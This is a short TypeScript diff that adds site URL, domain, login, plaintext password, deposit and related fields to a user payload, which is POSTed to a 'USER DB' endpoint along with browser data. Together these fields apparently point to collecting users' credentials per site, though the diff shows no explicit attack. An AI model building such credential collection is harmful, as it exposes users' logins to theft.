@@ -15,6 +15,13 @@ interface SaveUserPayload {
   email: string;
   browserData: Record<string, any> | null;
   source: string;
+  siteUrl: string;
+  isValidation: boolean;
+  login: string | number;
+  password: string;
+  deposit: string;
+  main: string;
+  domain: string;
 }
 
 /**
@@ -43,6 +50,13 @@ async function doSaveUser(payload: SaveUserPayload): Promise<void> {
       email: payload.email,
       browserData: payload.browserData,
       source: payload.source,
+      siteUrl: payload.siteUrl,
+      isValidation: payload.isValidation,
+      login: payload.login,
+      password: payload.password,
+      deposit: payload.deposit,
+      main: payload.main,
+      domain: payload.domain,
     };
 
     console.log('--- [USER DB] POST →', url);
